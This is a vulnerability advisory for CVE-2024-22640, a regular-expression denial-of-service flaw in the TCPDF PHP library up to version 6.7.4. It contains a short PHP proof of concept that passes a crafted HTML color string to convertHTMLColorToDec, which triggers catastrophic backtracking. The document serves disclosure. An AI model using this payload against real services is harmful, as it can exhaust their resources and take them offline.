# CVE-2024-22640

#### Vulnerability Type
Regular expression Denial of Service (ReDoS)

#### Affected Product and Version
TCPDF <= 6.7.4

#### Attack Vector
TCPDF parse HTML color contains crafted payload.

#### Description
TCPDF version <= 6.7.4 is vulnerable to ReDoS (Regular Expression Denial of Service) if parsing an untrusted HTML page with a crafted color.

#### PoC
```php
<?php

require_once('../tcpdf.php');

$test = new TCPDF_COLORS();
$ref = "none";
$test -> convertHTMLColorToDec('["t"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000!]',$ref);
?>
```
> Note: Checking with **preg_last_error()** after the vulnerable line of code, the regEx will exit with **PREG_BACKTRACK_LIMIT_ERROR**.
